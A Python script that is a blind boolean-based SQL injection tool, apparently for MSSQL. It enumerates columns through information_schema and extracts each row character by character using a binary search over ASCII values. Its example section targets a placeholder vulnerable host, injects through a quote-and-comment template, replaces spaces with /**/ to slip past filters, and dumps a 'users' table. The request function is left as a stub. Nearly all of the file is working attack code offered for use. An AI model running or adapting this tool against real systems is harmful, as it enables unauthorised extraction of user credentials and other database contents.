from __future__ import print_function

import re, os, sys

def get_cols(table, template, fn, get_str):
    query = "(select COUNT(column_name) from information_schema.columns where table_name='%s')" % (table)
    v = get_str(template, query, fn)
    columns = []
    for i in range(int(v)):
        spec = '' if i == 0 else (' and column_name not in (%s)' % ','.join(map(lambda x: "'%s'" % x, columns)))
        query = "(select top 1 column_name from information_schema.columns where table_name='%s' %s)" % (table, spec)
        c = get_str(template, query, fn)
        columns.append(c)
    return columns

def dump_table(table, template, fn, get_str):
    columns = get_cols(table, template, fn, get_str)
    print(columns)
    query = "(select COUNT(*) from %s)" % table
    n = get_str(template, query, fn)
    records = []
    for i in range(int(n)):
        cols_ = ','.join(map(lambda x: x, columns))
        spec = '' if i == 0 else ('where %s not in (%s)' % (columns[0], ','.join(map(lambda x: "%s" % x[0], records))))
        query = "(select top 1 concat_ws('|', %s) from %s %s)" % (cols_, table, spec)
        try:
            s = get_str(template, query, fn)
            records.append(s.split('|'))
        except Exception as e:
            print(e)
            exit(1)
    return records

# int implementation of it
def binary_search(fn, template, v1, maxLength=None):
    bound = [0, 0b11111111]
    result = 0
    while True:
        half = sum(bound) // 2
        if fn(template % (v1, str(half))):
            if bound[0] == half:
                result = half+1
                break
            bound[0] = half
        else:
            if bound[1] == half:
                result = half
                break
            bound[1] = half
    return result


# blind get character
def get_string(template, val, func):
    # val: 'version()'
    # get length
    ltemp = 'LEN(%s) > %s'
    length = binary_search(func, template % ltemp, val, 8) # content length limit: 2^8
    print('length: %d' % length)

    wtemp = 'ascii(substring(CAST((%s) AS VARCHAR(1000)), {0}, 1)) > %s'
    print('\r' + '_' * length, end='')
    output = ''
    for j in range(length):
        _ascii = binary_search(func, template % wtemp.format(j+1), val, 8)
        output += chr(_ascii)
        print('\r' + output + '_' * (length-j-1), end='')
        sys.stdout.flush()
    print()
    return output

if __name__ == '__main__':

    # ==== example ====
    url = 'http://<vuln-ip>'

    # boolean based SQLi
    def boolean(sql):
        from lxml import html
        import requests

        # post processing here
        sql = sql.replace(' ', '/**/')

        # logic here
        return False
    # ================

    # find all users
    temp = "ee' and (%s)-- "
    rows = dump_table('users', temp, boolean, get_string)
    for r in rows:
        print(r)
